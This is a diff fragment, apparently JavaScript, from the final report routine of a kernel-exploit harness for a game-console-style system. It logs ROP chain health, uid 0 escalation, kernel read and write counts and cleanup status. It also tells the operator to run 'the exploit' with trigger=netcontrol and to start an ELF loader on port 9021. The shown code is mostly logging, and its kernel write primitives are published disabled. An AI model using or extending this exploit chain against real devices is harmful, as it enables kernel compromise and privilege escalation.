+    return;
+  }
+  await ctx.telemetry.drain();
+
+  const m = ctx.measured;
+  const v = m.verdict || {};
+
+  const tc = ctx.telemetry.cost();
+  await api.log(
+    `telemetry: ${tc.emitted} lines in ${tc.writes} writes ` +
+    `(${tc.paints} mid-race, ${tc.drains} row-boundary), ` +
+    `${tc.issueMs} ms issuing` +
+    (tc.dropped ? `, ${tc.dropped} dropped` : ""), "info");
+  await api.log(
+    `ladder: ${summary.ladder} rows -- ${summary.passed} PASS, ${summary.failed} FAIL, ` +
+    `${summary.skipped} SKIP` +
+    (summary.stoppedAt ? ` (stopped at ${summary.stoppedAt})` : ""), "info");
+  if (engine) {
+    await api.log(
+      `trigger ${ctx.cfg.trigger}: fired=${engine.triggered ? "YES" : "no"}` +
+      `, alias=${engine.corrupt ? "YES" : "no"}` +
+      `, uid=${engine.S.jailbroken ? 0 : "?"}` +
+      `, kernel writes=${engine.kernelWrites}` +
+      `, crfrees=${engine.S.crfrees}, setuid calls=${engine.S.setuidCalls}, ` +
+      `kread ${engine.S.kreadOk}/${engine.S.kreadCalls}` +
+      `, kqueues ${engine.S.kqueuesOpened}/${engine.S.kqueuesClosed}`, "info");
+  }
+  if (m.rt) {
+    await api.log(
+      `chain round trip: ${m.rt.a.toFixed(2)} ms fixed + ` +
+      `${(m.rt.b * 1000).toFixed(1)} us per in-chain syscall`, "info");
+  }
+  if (m.stage0) {
+    await api.log(
+      `stage 0: ${m.stage0.attempts} attempts in ${m.stage0.ms} ms = ` +
+      `${(m.stage0.ms / Math.max(1, m.stage0.attempts)).toFixed(0)} ms/attempt`, "info");
+  }
+
+  const chainDead = !!ctx.chainDead;
+  if (chainDead) await api.log("the ROP chain died: " + ctx.chainDead, "error");
+  if (ctx.state.cleanupFailed)
+    await api.log("cleanup failed: " + ctx.state.cleanupFailed, "error");
+  if (v.reboot)
+    await api.log("REBOOT NOW -- " + (v.text || "this run changed kernel state that cleanup did not put back"), "error");
+  else if (summary.failed === 0 && !chainDead)
+    await api.log("all executed checks passed and cleanup reported clean", "success");
+  else
+    await api.log("nothing was claimed: see the rows above for where it stopped", "warn");
+
+  if (v.all && v.all.length > 1)
+    for (const reason of v.all) await api.log("  - " + reason, "warn");
+
+  // Save a retry verdict only if the report row completed.
+  const cleanVerdict = !!(v && !v.reboot && !chainDead && !ctx.state.cleanupFailed);
+  if (v) recordVerdict(cleanVerdict);
+  if (!v) {
+    await api.log(
+      "this run left no verdict, so a re-send in this session will refuse. Reboot " +
+      "before running poops again.", "warn");
+  }
+
+// Explain escalation skips when trigger=none selects the negative control.
+  if (ctx.cfg.trigger === "none" && !(engine && engine.S.jailbroken)) {
+    await api.log(
+      "trigger=none is upstream's NEGATIVE CONTROL, not a failure: the race never " +
+      "fires, so no chunk is ever aliased, so there is no triplet and stages 4-9 " +
+      "have nothing to escalate with. Everything else ran and was cleaned up -- " +
+      "that is why the verdict is FINE.", "warn");
+    await api.log(
+      "to actually run the exploit: --arg trigger=netcontrol   (add " +
+      "--arg payload=1 to start elfldr on 9021 once stage 4 proves uid 0)", "info");
+    if (latchStoreIsHeld()) {
+      await api.log(
+        "note ps1_prepare set the one-shot latch, so re-send with --arg latch-clear " +
+        "or reboot first", "info");
+    }
+  }
+
+  if (ctx.krw) {
+    api.krw = disarmKrw(ctx.krw);
+    await api.log("api.krw published -- read8/write4/write8 are DISABLED, see the header of this file", "warn");
+  } else {
+      await api.log("no krw handle to publish: stage 5 never ran", "warn");
+    }
+  };
